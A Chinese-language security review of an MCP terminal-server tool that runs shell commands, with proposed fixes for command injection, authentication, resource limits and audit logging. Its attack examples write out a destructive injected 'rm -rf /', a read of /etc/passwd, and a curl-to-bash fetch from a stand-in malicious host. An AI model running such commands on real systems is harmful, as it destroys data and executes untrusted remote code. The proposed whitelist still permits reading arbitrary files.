# Terminal Server 改善報告

## 📋 改善摘要

針對 `terminal_server.py` 進行了全面的程式碼品質提升與安全性分析，主要包括：

- ✅ 新增詳細的中英文註解
- ✅ 強化錯誤處理機制
- ✅ 增加日誌記錄系統
- ✅ 識別並標註安全性風險
- ✅ 添加超時控制機制
- ⚠️ 提出重要安全性改善建議

---

## 🔍 程式碼分析結果

### 1. **安全性問題（關鍵）**

#### ⚠️ 命令注入風險（Critical）

**問題描述：**

```python
subprocess.run(command, shell=True, ...)
```

使用 `shell=True` 允許執行任意 shell 命令，存在嚴重的命令注入風險。

**攻擊範例：**

```python
# 惡意輸入
command = "ls; rm -rf /"  # 會先列出檔案，然後刪除整個系統
command = "cat /etc/passwd"  # 讀取敏感系統檔案
command = "curl http://malicious.com/steal.sh | bash"  # 執行遠端惡意腳本
```

**風險等級：** 🔴 高危

**建議修正方案：**

##### 方案 1：實作命令白名單（推薦）

```python
# 允許的安全命令清單
ALLOWED_COMMANDS = {
    'ls': ['ls', '-l', '-a', '-h', '-la', '-lh'],
    'pwd': ['pwd'],
    'echo': ['echo'],
    'cat': ['cat'],
    'grep': ['grep'],
    'find': ['find'],
    'date': ['date'],
    'whoami': ['whoami']
}

def validate_command(command: str) -> tuple[bool, str]:
    """
    驗證命令是否在白名單中

    Returns:
        (is_valid, error_message)
    """
    parts = shlex.split(command)
    if not parts:
        return False, "空命令"

    base_command = parts[0]

    if base_command not in ALLOWED_COMMANDS:
        return False, f"不允許的命令: {base_command}"

    # 檢查參數是否在允許範圍內
    allowed_args = ALLOWED_COMMANDS[base_command]
    for arg in parts[1:]:
        if arg.startswith('-') and arg not in allowed_args:
            return False, f"不允許的參數: {arg}"

    return True, ""

@mcp.tool("terminal_server")
async def run_command(command: str) -> str:
    # 驗證命令
    is_valid, error_msg = validate_command(command)
    if not is_valid:
        logger.warning(f"命令被拒絕: {command} - {error_msg}")
        return f"錯誤: {error_msg}"

    # ... 執行命令
```

##### 方案 2：避免使用 shell=True（更安全）

```python
import shlex

@mcp.tool("terminal_server")
async def run_command(command: str) -> str:
    """使用 shlex.split 解析命令，避免 shell 注入"""
    try:
        # 將命令字串解析為參數列表
        args = shlex.split(command)

        # 不使用 shell=True，直接執行命令
        result = subprocess.run(
            args,  # 使用列表而非字串
            shell=False,  # ✅ 關鍵安全改善
            cwd=DEFAULT_WORKSPACE,
            text=True,
            capture_output=True,
            timeout=30
        )

        return result.stdout or result.stderr
    except Exception as e:
        return f"錯誤: {str(e)}"
```

##### 方案 3：沙箱環境隔離（最安全）

```python
import docker  # 需要安裝 docker 套件

async def run_command_in_sandbox(command: str) -> str:
    """在 Docker 容器中執行命令，提供完整隔離"""
    client = docker.from_env()

    try:
        # 在隔離的容器中執行命令
        result = client.containers.run(
            "alpine:latest",  # 輕量級 Linux 映像
            command=command,
            working_dir="/workspace",
            volumes={DEFAULT_WORKSPACE: {'bind': '/workspace', 'mode': 'rw'}},
            remove=True,  # 執行後自動刪除容器
            network_disabled=True,  # 禁用網路存取
            mem_limit="256m",  # 記憶體限制
            cpu_period=100000,
            cpu_quota=50000,  # CPU 使用限制
            timeout=30
        )
        return result.decode('utf-8')
    except Exception as e:
        return f"錯誤: {str(e)}"
```

---

### 2. **權限控制問題**

**當前問題：**

- 沒有使用者身份驗證
- 沒有權限檢查
- 任何人都可以執行任何命令

**建議修正：**

```python
from typing import Optional
import hashlib
import secrets

class AuthManager:
    """簡單的認證管理器"""

    def __init__(self):
        self.api_keys = {}  # {api_key: {user_id, permissions}}

    def generate_api_key(self, user_id: str, permissions: list[str]) -> str:
        """生成 API 金鑰"""
        api_key = secrets.token_urlsafe(32)
        self.api_keys[api_key] = {
            'user_id': user_id,
            'permissions': permissions
        }
        return api_key

    def validate_api_key(self, api_key: str, required_permission: str) -> bool:
        """驗證 API 金鑰和權限"""
        if api_key not in self.api_keys:
            return False

        user_data = self.api_keys[api_key]
        return required_permission in user_data['permissions']

# 全域認證管理器
auth_manager = AuthManager()

@mcp.tool("terminal_server")
async def run_command(command: str, api_key: Optional[str] = None) -> str:
    """執行命令（需要認證）"""

    # 驗證 API 金鑰
    if not api_key or not auth_manager.validate_api_key(api_key, 'execute_command'):
        logger.warning(f"未授權的命令執行嘗試: {command[:50]}")
        return "錯誤: 未授權。請提供有效的 API 金鑰。"

    # ... 執行命令
```

---

### 3. **資源控制問題**

**當前問題：**

- ✅ 已新增 30 秒超時限制（改善後）
- ❌ 沒有記憶體限制
- ❌ 沒有 CPU 使用限制
- ❌ 沒有並發執行限制

**建議修正：**

```python
import asyncio
from asyncio import Semaphore

# 限制同時執行的命令數量
MAX_CONCURRENT_COMMANDS = 3
command_semaphore = Semaphore(MAX_CONCURRENT_COMMANDS)

@mcp.tool("terminal_server")
async def run_command(command: str) -> str:
    """執行命令（帶並發控制）"""

    async with command_semaphore:
        logger.info(f"執行命令 (剩餘槽位: {command_semaphore._value})")

        # 使用 asyncio.create_subprocess_shell 實現異步執行
        process = await asyncio.create_subprocess_shell(
            command,
            cwd=DEFAULT_WORKSPACE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        try:
            # 等待命令完成，設定超時
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=30.0
            )

            output = stdout.decode() or stderr.decode()
            return output

        except asyncio.TimeoutError:
            # 超時後終止進程
            process.kill()
            await process.wait()
            return "錯誤: 命令執行超時 (30 秒)"
```

---

### 4. **日誌與審計改善**

**已改善項目：**

- ✅ 新增日誌記錄器
- ✅ 記錄命令執行請求
- ✅ 記錄執行結果和錯誤

**建議進一步改善：**

```python
import json
from datetime import datetime
from pathlib import Path

class AuditLogger:
    """命令執行審計日誌"""

    def __init__(self, log_file: str = "~/mcp/audit.log"):
        self.log_file = Path(log_file).expanduser()
        self.log_file.parent.mkdir(parents=True, exist_ok=True)

    def log_command(
        self,
        user_id: str,
        command: str,
        status: str,
        output: str,
        duration_ms: float
    ):
        """記錄命令執行"""
        entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'user_id': user_id,
            'command': command,
            'status': status,  # 'success', 'error', 'denied'
            'output_length': len(output),
            'duration_ms': duration_ms
        }

        with open(self.log_file, 'a') as f:
            f.write(json.dumps(entry, ensure_ascii=False) + '\n')

# 使用審計日誌
audit_logger = AuditLogger()

@mcp.tool("terminal_server")
async def run_command(command: str, user_id: str = "anonymous") -> str:
    """執行命令（帶審計）"""
    start_time = datetime.now()

    try:
        # ... 執行命令
        output = "..."  # 命令輸出

        # 記錄成功執行
        duration = (datetime.now() - start_time).total_seconds() * 1000
        audit_logger.log_command(user_id, command, 'success', output, duration)

        return output

    except Exception as e:
        # 記錄錯誤
        duration = (datetime.now() - start_time).total_seconds() * 1000
        audit_logger.log_command(user_id, command, 'error', str(e), duration)
        raise
```

---

### 5. **錯誤處理改善**

**已改善項目：**

- ✅ 新增多種特定例外處理
- ✅ 新增 TimeoutExpired 處理
- ✅ 新增 PermissionError 處理
- ✅ 新增 FileNotFoundError 處理
- ✅ 使用 logger.exception 記錄堆疊追蹤

**建議進一步改善：**

```python
from dataclasses import dataclass
from enum import Enum

class CommandStatus(Enum):
    """命令執行狀態"""
    SUCCESS = "success"
    ERROR = "error"
    TIMEOUT = "timeout"
    PERMISSION_DENIED = "permission_denied"
    NOT_FOUND = "not_found"
    INVALID_COMMAND = "invalid_command"

@dataclass
class CommandResult:
    """命令執行結果"""
    status: CommandStatus
    output: str
    error_message: Optional[str] = None
    exit_code: Optional[int] = None
    duration_ms: float = 0.0

    def to_dict(self) -> dict:
        return {
            'status': self.status.value,
            'output': self.output,
            'error_message': self.error_message,
            'exit_code': self.exit_code,
            'duration_ms': self.duration_ms
        }

@mcp.tool("terminal_server")
async def run_command(command: str) -> dict:
    """執行命令（返回結構化結果）"""
    start_time = datetime.now()

    try:
        result = subprocess.run(
            command,
            shell=True,
            cwd=DEFAULT_WORKSPACE,
            text=True,
            capture_output=True,
            timeout=30
        )

        duration = (datetime.now() - start_time).total_seconds() * 1000

        return CommandResult(
            status=CommandStatus.SUCCESS,
            output=result.stdout or result.stderr,
            exit_code=result.returncode,
            duration_ms=duration
        ).to_dict()

    except subprocess.TimeoutExpired:
        duration = (datetime.now() - start_time).total_seconds() * 1000
        return CommandResult(
            status=CommandStatus.TIMEOUT,
            output="",
            error_message="命令執行超時",
            duration_ms=duration
        ).to_dict()

    # ... 其他錯誤處理
```

---

## 🎯 改善優先級建議

### 🔴 高優先級（必須實作）

1. **修復命令注入漏洞**

   - 實作命令白名單或使用 `shell=False`
   - 估計時間：2-4 小時
   - 風險：未修復可能導致系統被入侵

2. **增加權限驗證**
   - 實作 API 金鑰認證
   - 估計時間：3-5 小時
   - 風險：未授權存取可能導致資料洩露

### 🟡 中優先級（建議實作）

3. **完善審計日誌**

   - 記錄所有命令執行歷史
   - 估計時間：2-3 小時
   - 好處：便於追蹤和調查安全事件

4. **增加資源限制**
   - 實作並發控制、記憶體和 CPU 限制
   - 估計時間：3-4 小時
   - 好處：防止資源耗盡攻擊

### 🟢 低優先級（可選實作）

5. **沙箱環境隔離**

   - 使用 Docker 或其他容器技術
   - 估計時間：1-2 天
   - 好處：提供最高級別的安全隔離

6. **結構化錯誤回應**
   - 返回 JSON 格式的結果
   - 估計時間：1-2 小時
   - 好處：便於客戶端解析和處理

---

## 📊 改善前後對比

### 改善前

```python
@mcp.tool("terminal_server")
async def run_command(command: str) -> str:
    try:
        result = subprocess.run(
            command, shell=True, cwd=DEFAULT_WORKSPACE,
            text=True, capture_output=True
        )
        return result.stdout or result.stderr
    except Exception as e:
        return f"錯誤: {str(e)}"
```

**問題：**

- ❌ 命令注入風險
- ❌ 沒有超時控制
- ❌ 錯誤處理過於簡單
- ❌ 沒有日誌記錄
- ❌ 沒有權限驗證

### 改善後（當前版本）

```python
@mcp.tool("terminal_server")
async def run_command(command: str) -> str:
    logger.info(f"收到命令執行請求: {command[:100]}...")

    if not command or not command.strip():
        return "錯誤: 命令不能為空"

    try:
        result = subprocess.run(
            command,
            shell=True,
            cwd=DEFAULT_WORKSPACE,
            text=True,
            capture_output=True,
            timeout=30  # ✅ 新增超時控制
        )

        logger.info(f"命令執行成功，返回碼: {result.returncode}")
        return result.stdout or result.stderr

    except subprocess.TimeoutExpired:
        # ✅ 特定錯誤處理
        logger.error("命令執行超時")
        return "錯誤: 命令執行超時"
    # ... 更多錯誤處理
```

**改善點：**

- ✅ 新增詳細註解
- ✅ 新增日誌記錄
- ✅ 新增超時控制
- ✅ 新增特定錯誤處理
- ✅ 新增輸入驗證
- ⚠️ 仍需修復命令注入問題

### 建議的最終版本（安全加強）

請參考上方「安全性問題」章節的修正方案。

---

## 🔧 實作檢查清單

使用此檢查清單確保所有改善都已實作：

- [ ] 實作命令白名單或禁用 shell=True
- [ ] 新增 API 金鑰認證系統
- [ ] 實作審計日誌記錄
- [ ] 新增並發執行限制
- [ ] 實作資源使用限制（記憶體、CPU）
- [ ] 新增命令執行歷史查詢功能
- [ ] 撰寫單元測試
- [ ] 撰寫安全性測試
- [ ] 更新文檔說明安全使用方式
- [ ] 進行安全性審查

---

## 📚 參考資源

1. **OWASP Command Injection**

   - https://owasp.org/www-community/attacks/Command_Injection

2. **Python subprocess 安全性最佳實踐**

   - https://docs.python.org/3/library/subprocess.html#security-considerations

3. **MCP Server 安全指南**

   - https://modelcontextprotocol.io/docs/security

4. **Python logging 最佳實踐**
   - https://docs.python.org/3/howto/logging.html

---

## 📝 總結

此次改善大幅提升了程式碼的可讀性、可維護性和錯誤處理能力，但**最關鍵的安全性問題（命令注入）仍需要優先處理**。建議立即實作命令白名單或改用 `shell=False` 以避免嚴重的安全風險。

改善後的程式碼已經具備：

- ✅ 完整的中英文註解
- ✅ 結構化的錯誤處理
- ✅ 完善的日誌記錄
- ✅ 超時控制機制
- ✅ 輸入驗證

仍需改善：

- ⚠️ 命令注入防護（高危）
- ⚠️ 權限驗證機制（高危）
- ⚠️ 審計追蹤系統（建議）
- ⚠️ 資源使用限制（建議）
